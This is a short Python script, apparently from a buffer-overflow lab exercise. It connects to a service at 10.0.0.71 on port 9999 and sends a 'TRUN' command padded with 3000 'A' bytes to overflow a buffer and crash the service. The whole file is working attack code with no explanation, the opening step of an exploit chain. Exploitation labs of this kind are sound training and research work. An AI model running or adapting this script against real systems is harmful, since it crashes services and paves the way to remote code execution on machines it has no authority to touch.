#!/usr/bin/python
# -*- coding: utf-8 -*-
#!/usr/bin/python

import sys, socket

buffer = "\x41" * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.0.71', 9999))
s.send(('TRUN /.:/' + buffer))
s.recv(1024)
s.close()
